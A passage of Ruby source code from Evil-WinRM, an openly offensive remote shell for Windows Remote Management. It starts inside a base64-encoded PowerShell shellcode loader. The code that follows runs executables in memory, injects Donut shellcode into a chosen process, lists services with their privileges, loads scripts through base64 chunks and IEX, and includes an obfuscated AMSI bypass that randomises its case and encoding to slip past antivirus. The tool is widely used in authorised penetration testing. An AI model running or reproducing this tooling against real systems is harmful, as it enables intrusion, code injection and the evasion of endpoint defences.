gMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMApbU3lzdGVtLlJlZmxlY3Rpb24uQXNzZW1ibHldOjpMb2FkKCRieXRlcykgfCBPdXQtTnVsbAokYmFzZTY0ID0gJGRvbnV0ZmlsZQpbYXJyYXldJGFycmF5ID0gJHByb2Nlc3NfaWQsJEJhc2U2NApbU2hlbGxjb2RlVGVzdC5Qcm9ncmFtXTo6TWFpbigkYXJyYXkpCn0KfQpmdW5jdGlvbiBzaG93LW1ldGhvZHMtbG9hZGVkIHskZ2xvYmFsOnNob3dtZXRob2RzfQo=")
        command = ""

        begin
            time = Time.now.to_i
            self.print_message("Establishing connection to remote endpoint", TYPE_INFO)
            $conn.shell(:powershell) do |shell|
                begin
                    completion =
                    proc do |str|
                    case
                        when Readline.line_buffer =~ /help.*/i
                            puts("#{$LIST.join("\t")}")
                        when Readline.line_buffer =~ /Invoke-Binary.*/i
                            result = @executables.grep( /^#{Regexp.escape(str)}/i ) || []
                            if result.empty? then
                                paths = self.paths(str)
                                result.concat(paths.grep( /^#{Regexp.escape(str)}/i ))
                            end
                            result.uniq
                        when Readline.line_buffer =~ /donutfile.*/i
                            paths = self.paths(str)
                            paths.grep( /^#{Regexp.escape(str)}/i )
                        when Readline.line_buffer =~ /Donut-Loader -process_id.*/i
                            $DONUTPARAM2.grep( /^#{Regexp.escape(str)}/i ) unless str.nil?
                        when Readline.line_buffer =~ /Donut-Loader.*/i
                            $DONUTPARAM1.grep( /^#{Regexp.escape(str)}/i ) unless str.nil?
                        when Readline.line_buffer =~ /^upload.*/i
                            test_s = Readline.line_buffer.gsub('\\ ', '\#\#\#\#')
                            if test_s.count(' ') < 2 then
                                self.paths(str) || []
                            else
                                self.complete_path(str, shell) || []
                            end
                        when Readline.line_buffer =~ /^download.*/i
                            test_s = Readline.line_buffer.gsub('\\ ', '\#\#\#\#')
                            if test_s.count(' ') < 2 then
                                self.complete_path(str, shell) || []
                            else
                                paths = self.paths(str)
                            end
                        when (Readline.line_buffer.empty? || !(Readline.line_buffer.include?(' ') || Readline.line_buffer =~ /^\"?(\.\/|\.\.\/|[a-z,A-Z]\:\/|\~\/|\/)/))
                            result = $COMMANDS.grep( /^#{Regexp.escape(str)}/i ) || []
                            result.concat(@functions.grep(/^#{Regexp.escape(str)}/i))
                            result.uniq
                        else
                            result = Array.new
                            result.concat(self.complete_path(str, shell) || [])
                            result
                        end
                    end

                    Readline.completion_proc = completion
                    Readline.completion_append_character = ''
                    Readline.completion_case_fold = true
                    Readline.completer_quote_characters = "\""

                    until command == "exit" do
                        pwd = shell.run("(get-location).path").output.strip

                        if $colors_enabled then
                            command = Readline.readline(self.colorize("*Evil-WinRM*", "red") + self.colorize(" PS ", "yellow") + pwd + "> ", true)
                        else
                            command = Readline.readline("*Evil-WinRM* PS " + pwd + "> ", true)
                        end
                        if !$logger.nil?
                            $logger.info("*Evil-WinRM* PS #{pwd} > #{command}")
                        end

                        if command.start_with?('upload') then
                            if self.docker_detection() then
                                puts()
                                self.print_message("Remember that in docker environment all local paths should be at /data and it must be mapped correctly as a volume on docker run command", TYPE_WARNING, true, $logger)
                            end

                            begin
                                paths = self.get_upload_paths(command, pwd)
                                right_path = paths.pop
                                left_path = paths.pop

                                self.print_message("Uploading #{left_path} to #{right_path}", TYPE_INFO, true, $logger)
                                file_manager.upload(left_path, right_path) do |bytes_copied, total_bytes|
                                    self.progress_bar(bytes_copied, total_bytes)
                                    if bytes_copied == total_bytes then
                                        puts("                                                             ")
                                        self.print_message("#{bytes_copied} bytes of #{total_bytes} bytes copied", TYPE_DATA, true, $logger)
                                        self.print_message("Upload successful!", TYPE_INFO, true, $logger)
                                    end
                                end
                            rescue StandardError => err
                                self.print_message("#{err.to_s}: #{err.backtrace}", TYPE_ERROR, true, $logger)
                                self.print_message("Upload failed. Check filenames or paths", TYPE_ERROR, true, $logger)
                            ensure
                                command = ""
                            end
                        elsif command.start_with?('download') then
                            if self.docker_detection() then
                                puts()
                                self.print_message("Remember that in docker environment all local paths should be at /data and it must be mapped correctly as a volume on docker run command", TYPE_WARNING, true, $logger)
                            end

                            begin
                                paths = self.get_download_paths(command, pwd)
                                right_path = paths.pop
                                left_path = paths.pop

                                self.print_message("Downloading #{left_path} to #{right_path}", TYPE_INFO, true, $logger)
                                size = self.filesize(shell, left_path)
                                file_manager.download(left_path, right_path, size: size) do | index, size |
                                    self.progress_bar(index, size)
                                end
                                puts("                                                             ")
                                self.print_message("Download successful!", TYPE_INFO, true, $logger)
                            rescue StandardError => err
                                self.print_message("Download failed. Check filenames or paths", TYPE_ERROR, true, $logger)
                            ensure
                                command = ""
                            end
                        elsif command.start_with?('Invoke-Binary') then
                            begin
                                invoke_Binary = command.tokenize
                                command = ""
                                if !invoke_Binary[1].to_s.empty? then
                                    load_executable = invoke_Binary[1]
                                    load_executable = File.binread(load_executable)
                                    load_executable = Base64.strict_encode64(load_executable)
                                    if !invoke_Binary[2].to_s.empty?
                                        output = shell.run("Invoke-Binary " + load_executable + " ," + invoke_Binary[2])
                                        puts(output.output)
                                    elsif invoke_Binary[2].to_s.empty?
                                        output = shell.run("Invoke-Binary " + load_executable)
                                        puts(output.output)
                                    end
                                elsif
                                    output = shell.run("Invoke-Binary")
                                    puts(output.output)
                                end
                            rescue StandardError => err
                                self.print_message("Check filenames", TYPE_ERROR, true, $logger)
                            end

                        elsif command.start_with?('Donut-Loader') then
                            begin
                                donut_Loader = command.tokenize
                                command = ""
                                if !donut_Loader[4].to_s.empty? then
                                    pid = donut_Loader[2]
                                    load_executable = donut_Loader[4]
                                    load_executable = File.binread(load_executable)
                                    load_executable = Base64.strict_encode64(load_executable)
                                    output = shell.run("Donut-Loader -process_id #{pid} -donutfile #{load_executable}")
                                elsif
                                    output = shell.run("Donut-Loader")
                                end
                                print(output.output)
                                if !$logger.nil?
                                    $logger.info(output.output)
                                end
                            rescue
                                self.print_message("Check filenames", TYPE_ERROR, true, $logger)
                            end

                        elsif command.start_with?('services') then
                            command = ""
                            output = shell.run('$servicios = Get-ItemProperty "registry::HKLM\System\CurrentControlSet\Services\*" | Where-Object {$_.imagepath -notmatch "system" -and $_.imagepath -ne $null } | Select-Object pschildname,imagepath  ; foreach ($servicio in $servicios  ) {Get-Service $servicio.PSChildName -ErrorAction SilentlyContinue | Out-Null ; if ($? -eq $true) {$privs = $true} else {$privs = $false} ; $Servicios_object = New-Object psobject -Property @{"Service" = $servicio.pschildname ; "Path" = $servicio.imagepath ; "Privileges" = $privs} ;  $Servicios_object }')
                            print(output.output.chomp)
                            if !$logger.nil?
                                $logger.info(output.output.chomp)
                            end
                        elsif command.start_with?(*@functions) then
                            self.silent_warnings do
                                load_script = $scripts_path + command
                                command = ""
                                load_script = load_script.gsub(" ","")
                                load_script = File.binread(load_script)
                                load_script = Base64.strict_encode64(load_script)
                                script_split = load_script.scan(/.{1,5000}/)
                                script_split.each do |item|
                                    output = shell.run("$a += '#{item}'")
                                end
                                output = shell.run("IEX ([System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String($a))).replace('???','')")
                                output = shell.run("$a = $null")
                            end

                        elsif command.start_with?('menu') then
                            command = ""
                            self.silent_warnings do
                                output = shell.run(menu)
                                output = shell.run("Menu")
                                autocomplete = shell.run("auto").output.chomp
                                autocomplete = autocomplete.gsub!(/\r\n?/, "\n")
                                assemblyautocomplete = shell.run("show-methods-loaded").output.chomp
                                assemblyautocomplete = assemblyautocomplete.gsub!(/\r\n?/, "\n")
                                if !assemblyautocomplete.to_s.empty?
                                    $LISTASSEMNOW = assemblyautocomplete.split("\n")
                                    $LISTASSEM = $LISTASSEM + $LISTASSEMNOW
                                end
                                $LIST2 = autocomplete.split("\n")
                                $LIST = $LIST + $LIST2
                                $COMMANDS = $COMMANDS + $LIST2
                                $COMMANDS = $COMMANDS.uniq
                                message_output = output.output.chomp("\n") + "[+] " + $CMDS.join("\n").gsub(/\n/, "\n[+] ") + "\n\n"
                                puts(message_output)
                                if !$logger.nil?
                                    $logger.info(message_output)
                                end
                            end

                        elsif (command == "Bypass-4MSI")
                            command = ""
                            timeToWait = (time + 20) - Time.now.to_i

                            if timeToWait > 0
                                puts()
                                self.print_message("AV could be still watching for suspicious activity. Waiting for patching...", TYPE_WARNING, true, $logger)
                                sleep(timeToWait)
                            end
                            if !@Bypass_4MSI_loaded
                                self.load_Bypass_4MSI(shell)
                                @Bypass_4MSI_loaded = true
                            end
                        end
                        output = shell.run(command) do |stdout, stderr|
                            stdout&.each_line do |line|
                                STDOUT.puts(line.rstrip!)
                            end
                            STDERR.print(stderr)
                        end
                        if !$logger.nil? && !command.empty?
                            output_logger=""
                            output.output.each_line do |line|
                                output_logger += "#{line.rstrip!}\n"
                            end
                            $logger.info(output_logger)
                        end
                    end
                rescue Errno::EACCES => ex
                    puts()
                    self.print_message("An error of type #{ex.class} happened, message is #{ex.message}", TYPE_ERROR, true, $logger)
                    retry
                rescue Interrupt
                    puts("\n\n")
                    self.print_message("Press \"y\" to exit, press any other key to continue", TYPE_WARNING, true, $logger)
                    if STDIN.getch.downcase == "y"
                        self.custom_exit(130)
                    else
                        retry
                    end
                end
            self.custom_exit(0)
        end
        rescue SystemExit
        rescue SocketError
            self.print_message("Check your /etc/hosts file to ensure you can resolve #{$host}", TYPE_ERROR, true, $logger)
            self.custom_exit(1)
        rescue Exception => ex
            self.print_message("An error of type #{ex.class} happened, message is #{ex.message}", TYPE_ERROR, true, $logger)
            self.custom_exit(1)
        end
    end

    def random_string(len=3)
        Array.new(len){ [*'0'..'9',*'A'..'Z',*'a'..'z'].sample }.join
    end

    def random_case(word)
        word.chars.map { |c| (rand 2) == 0 ? c : c.upcase }.join
    end

    def get_char_expresion(the_char)
        rand_val = rand(10000) + rand(100)
        val = the_char.ord + rand_val
        char_val = self.random_case("char")

        return "[#{char_val}](#{val.to_s}-#{rand_val.to_s})"
    end

    def get_byte_expresion(the_char)
        rand_val = rand(30..120)
        val = the_char.ord + rand_val
        char_val = self.random_case("char")
        byte_val = self.random_case("byte")

        return "[#{char_val}]([#{byte_val}] 0x#{val.to_s(16)}-0x#{rand_val.to_s(16)})"
    end

    def get_char_raw(the_char)
        return "\"#{the_char}\""
    end

    def generate_random_type_string()
        to_randomize = self.random_case("System.Management.Automation.AmsiUtils")
        result = ""
        to_randomize.chars.each { |c| result +=  "+#{(rand 2) == 0 ? (rand 2) == 0 ? self.get_char_raw(c): self.get_byte_expresion(c) : self.get_char_expresion(c)}"}
        result[1..-1]
    end

    def get_Bypass_4MSI()
        bypass_template = "W1J1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLk1hcnNoYWxdOjpXcml0ZUJ5dGUoW1JlZl0uQXNzZW1ibHkuR2V0VHlwZSgiIiskdmFyMSsiIiwgJGZhbHNlLCAkdHJ1ZSkuR2V0RmllbGQoJycrJChbU3lzdGVtLk5ldC5XZWJVdGlsaXR5XTo6SHRtbERlY29kZSgnJiM5NzsmIzEwOTsmIzExNTsmIzEwNTsnKSkrJ0NvbnRleHQnLFtSZWZsZWN0aW9uLkJpbmRpbmdGbGFnc10nTm9uUHVibGljLFN0YXRpYycpLkdldFZhbHVlKCRudWxsKSw1KQo="
        dec_template = Base64.decode64(bypass_template)
        result = dec_template.gsub("$var1", self.generate_random_type_string())
        @bypass_amsi_words_random_case.each {|w| result.gsub!("#{w}", self.random_case(w)) }
        result
    end

    def load_Bypass_4MSI(shell)
        bypass = self.get_Bypass_4MSI()
        output = shell.run(bypass)
        if output.output.empty? then
            self.print_message("[+] Success!", TYPE_SUCCESS, false)
        else
            puts(output.output)
        end
    end

    def extract_filename(path)
        path.split('/')[-1]
    end

    def extract_next_quoted_path(cmd_with_quoted_path)
        begin_i = cmd_with_quoted_path.index("\"")
        l_total = cmd_with_quoted_path.length()
        next_i = cmd_with_quoted_path[begin_i +1, l_total - begin_i].index("\"")
        result = cmd_with_quoted_path[begin_i +1, next_i]
        result
    end

    def get_upload_paths(upload_command, pwd)
        quotes = upload_command.count("\"")
        result = []
        if quotes == 0 || quotes % 2 != 0 then
            result = upload_command.split(' ')
            result.delete_at(0)
        else
            quoted_path = self.extract_next_quoted_path(upload_command)
            upload_command = upload_command.gsub("\"#{quoted_path}\"", '')
            result = upload_command.split(' ')
            result.delete_at(0)
            result.push(quoted_path) unless quoted_path.nil? || quoted_path.empty?
        end
        result.push("#{pwd}\\#{self.extract_filename(result[0])}") if result.length == 1
        result
    end

    def get_download_paths(download_command, pwd)
        quotes = download_command.count("\"")
        result = []
        if quotes == 0 || quotes % 2 != 0 then
            result = download_command.split(' ')
            result.delete_at(0)
        else
            quoted_path = self.extract_next_quoted_path(download_command)
            download_command = download_command.gsub("\"#{quoted_path}\"", '')
            result.push(quoted_path)
            rest = download_command.split(' ')
            unless rest.nil? || rest.empty?
                rest.delete_at(0)
                result.push(rest[0]) if rest.length == 1
            end
        end

        result.push("./#{self.extract_filename(result[0])}") if result.length == 1
        result
    end

    def get_from_cache(n_path)
        unless n_path.nil? || n_path.empty? then
            a_path = self.normalize_path(n_path)
            current_time = Time.now.to_i
            current_vals = @directories[a_path]
            result = Array.new
            unless current_vals.nil? then
                is_valid = current_vals['time'] > current_time - @cache_ttl
                result = current_vals['files'] if is_valid
                @directories.delete(a_path) unless is_valid
            end

            return result
        end
    end

    def set_cache(n_path, paths)
        unless n_path.nil? || n_path.empty? then
            a_path = self.normalize_path(n_path)
            current_time = Time.now.to_i
            @directories[a_path] = { 'time' => current_time, 'files' => paths }
        end
    end

    def normalize_path(str)
        p_str = str || ""
        p_str = str.gsub('\\', '/')
        p_str = Regexp.escape(str)
        p_str
    end

    def get_dir_parts(n_path)
        return [n_path, "" ] if !!(n_path[-1] =~ /\/$/)
        i_last = n_path.rindex('/')
        if i_last.nil?
            return ["./", n_path]
        end

        next_i = i_last + 1
        amount = n_path.length() - next_i

        return [n_path[0, i_last + 1], n_path[next_i, amount]]
    end

    def complete_path(str, shell)
        if @completion_enabled then
            if !str.empty? && !!(str =~ /^(\.\/|[a-z,A-Z]\:|\.\.\/|\~\/|\/)*/i) then
                n_path = str
                parts = self.get_dir_parts(n_path)
                dir_p = parts[0]
                nam_p = parts[1]
                result = []
                result = self.get_from_cache(dir_p) unless dir_p =~ /^(\.\/|\.\.\/|\~|\/)/

                if result.nil? || result.empty? then
                    target_dir = dir_p
                    pscmd = "$a=@();$(ls '#{target_dir}*' -ErrorAction SilentlyContinue -Force |Foreach-Object {  if((Get-Item $_.FullName -ErrorAction SilentlyContinue) -is [System.IO.DirectoryInfo] ){ $a +=  \"$($_.FullName.Replace('\\','/'))/\"}else{  $a += \"$($_.FullName.Replace('\\', '/'))\" } });$a += \"$($(Resolve-Path -Path '#{target_dir}').Path.Replace('\\','/'))\";$a"

                    output = shell.run(pscmd).output
                    s = output.to_s.gsub(/\r/, '').split(/\n/)

                    dir_p = s.pop
                    self.set_cache(dir_p, s)
                    result = s
                end
                dir_p = dir_p + "/" unless dir_p[-1] == "/"
                path_grep = self.normalize_path(dir_p + nam_p)
                path_grep = path_grep.chop() if !path_grep.empty? && path_grep[0] == "\""
                filtered = result.grep(/^#{path_grep}/i)
                return filtered.collect{ |x| "\"#{x}\"" }
            end
        end
    end
end

# Class to create array (tokenize) from a string
class String def tokenize
    self.
        split(/\s(?=(?:[^'"]|'[^']*'|"[^"]*")*$)/).
        select {|s| not s.empty? }.
        map {|s| s.gsub(/(^ +)|( +$)|(^["']+)|(["']+$)/,'')}
    end
end

# Execution
e = EvilWinRM.new
e.main
